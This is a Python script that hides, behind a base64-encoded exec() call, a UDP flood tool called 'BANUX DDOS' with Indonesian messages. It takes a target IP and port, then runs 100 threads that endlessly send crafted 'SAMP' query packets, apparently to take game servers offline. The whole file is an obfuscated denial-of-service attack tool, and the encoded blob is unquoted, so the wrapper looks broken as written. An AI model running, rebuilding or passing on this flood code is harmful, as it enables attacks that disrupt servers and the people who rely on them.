import base64
exec(base64.b64decode(aW1wb3J0IHNvY2tldAppbXBvcnQgc3RydWN0CmltcG9ydCBjb2RlY3Msc3lzCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHJhbmRvbQppbXBvcnQgdGltZQppbXBvcnQgb3MKZnJvbSB0ZXJtY29sb3IgaW1wb3J0IGNvbG9yZWQKCgpkZWYgcHJpbnRfU2xvd1R5cGUoc3RyKToKICAgIGZvciBsZXR0ZXIgaW4gc3RyOgogICAgICAgIHN5cy5zdGRvdXQud3JpdGUobGV0dGVyKQogICAgICAgIHN5cy5zdGRvdXQuZmx1c2goKQogICAgICAgIHRpbWUuc2xlZXAoMC4xKQoKCgpvcy5zeXN0ZW0oJ2NsZWFyJykKcHJpbnRfU2xvd1R5cGUoIlNhYmFyLi4uLi4uLi4iKQp0aW1lLnNsZWVwKDMpCm9zLnN5c3RlbSgnY2xlYXInKQoKCgppcCA9IHN5cy5hcmd2WzFdCnBvcnQgPSBzeXMuYXJndlsyXQpvcmdpcCA9aXAKCmJhbnV4ID0gW2NvZGVjcy5kZWNvZGUoIjUzNDE0ZDUwOTBkOTFkNGQ2MTFlNzAwYTQ2NWIwMCIsImhleF9jb2RlYyIpLCNwCiAgICAgICAgICAgICAgICAgICAgICAgY29kZWNzLmRlY29kZSgiNTM0MTRkNTA5NTM4ZTFhOTYxMWU2MyIsImhleF9jb2RlYyIpLCNjCiAgICAgICAgICAgICAgICAgICAgICAgY29kZWNzLmRlY29kZSgiNTM0MTRkNTA5NTM4ZTFhOTYxMWU2OSIsImhleF9jb2RlYyIpLCNpCiAgICAgICAgICAgICAgICAgICAgICAgY29kZWNzLmRlY29kZSgiNTM0MTRkNTA5NTM4ZTFhOTYxMWU3MiIsImhleF9jb2RlYyIpLCNyCiAgICAgICAgICAgICAgICAgICAgICAgY29kZWNzLmRlY29kZSgiMDgxZTYyZGEiLCJoZXhfY29kZWMiKSwgI3BvcnQgNzc5NgogICAgICAgICAgICAgICAgICAgICAgIGNvZGVjcy5kZWNvZGUoIjA4MWU3N2RhIiwiaGV4X2NvZGVjIiksI3BvcnQgNzc3NwogICAgICAgICAgICAgICAgICAgICAgIGNvZGVjcy5kZWNvZGUoIjA4MWU0ZGRhIiwiaGV4X2NvZGVjIiksIyBwb3J0IDc3NzEKICAgICAgICAgICAgICAgICAgICAgICBjb2RlY3MuZGVjb2RlKCIwMjFlZmQ0MCIsImhleF9jb2RlYyIpLCNwb3J0IDc3ODQKICAgICAgICAgICAgICAgICAgICAgICBjb2RlY3MuZGVjb2RlKCIwMjFlZmQ0MCIsImhleF9jb2RlYyIpLCNwb3J0IDExMTEgCiAgICAgICAgICAgICAgICAgICAgICAgY29kZWNzLmRlY29kZSgiMDgxZTdlZGEiLCJoZXhfY29kZWMiKSMgcG9ydCAxMTExIHRhbWJlbQogICAgICAgICAgICAgICAgICAgICAgIF0KCnByaW50IGNvbG9yZWQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iLCAoJ3JlZCcpKQpwcmludF9TbG93VHlwZSgiXG5CQU5VWCBNZW55ZXJhbmcgaXA6ICVzIERhbiBNZW1idW51aCBQb3J0OiAlcyIlKG9yZ2lwLHBvcnQpKQpwcmludCBjb2xvcmVkKCJcbj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0gIiwgKCdyZWQnKSkKCiAgICAgICAgICAgIAoKCgoKCmNsYXNzIE15VGhyZWFkKHRocmVhZGluZy5UaHJlYWQpOgogICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICBzb2NrID0gc29ja2V0LnNvY2tldCgKICAgICAgICAgICAgICAgICAgICBzb2NrZXQuQUZfSU5FVCwgc29ja2V0LlNPQ0tfREdSQU0pICMgSW50ZXJuZXQgYW5kIFVEUAogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBtc2cgPSBiYW51eFtyYW5kb20ucmFuZHJhbmdlKDAsMyldCiAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgc29jay5zZW5kdG8obXNnLCAoaXAsIGludChwb3J0KSkpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYoaW50KHBvcnQpID09IDc3NzcpOgogICAgICAgICAgICAgICAgICAgIHNvY2suc2VuZHRvKGJhbnV4WzVdLCAoaXAsIGludChwb3J0KSkpCiAgICAgICAgICAgICAgICBlbGlmKGludChwb3J0KSA9PSA3Nzk2KToKICAgICAgICAgICAgICAgICAgICBzb2NrLnNlbmR0byhiYW51eFs0XSwgKGlwLCBpbnQocG9ydCkpKQogICAgICAgICAgICAgICAgZWxpZihpbnQocG9ydCkgPT0gNzc3MSk6CiAgICAgICAgICAgICAgICAgICAgc29jay5zZW5kdG8oYmFudXhbNl0sIChpcCwgaW50KHBvcnQpKSkKICAgICAgICAgICAgICAgIGVsaWYoaW50KHBvcnQpID09IDc3ODQpOgogICAgICAgICAgICAgICAgICAgIHNvY2suc2VuZHRvKGJhbnV4WzddLCAoaXAsIGludChwb3J0KSkpCiAgICAgICAgICAgICAgICBlbGlmKGludChwb3J0KSA9PSAxMTExKToKICAgICAgICAgICAgICAgICAgICBzb2NrLnNlbmR0byhiYW51eFs5XSwgKGlwLCBpbnQocG9ydCkpKSAgICAKICAgICAgICAgICAgICAgIAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHRyeToKICAgICBmb3IgeCBpbiByYW5nZSgxMDApOiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICBteXRocmVhZCA9IE15VGhyZWFkKCkgIAogICAgICAgICAgICBteXRocmVhZC5zdGFydCgpICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICB0aW1lLnNsZWVwKC4xKSAgICAKICAgIGV4Y2VwdChLZXlib2FyZEludGVycnVwdCk6CiAgICAgICAgIG9zLnN5c3RlbSgnY2xzJyBpZiBvcy5uYW1lID09ICdudCcgZWxzZSAnY2xlYXInKQogICAgICAgICAKICAgICAgICAgcHJpbnQoJyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMnKQogICAgICAgICBwcmludCgnQkFOVVggRERPUycpCiAgICAgICAgIHByaW50KCcjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjJykKICAgICAgICAgcHJpbnQoJ1xuXG4nKQogICAgICAgICBwcmludCgnTWVueWVyYW5nIElwIHt9IERpaGVudGlrYW4nLmZvcm1hdChvcmdpcCkpCiAgICAgICAgIHBhc3M=))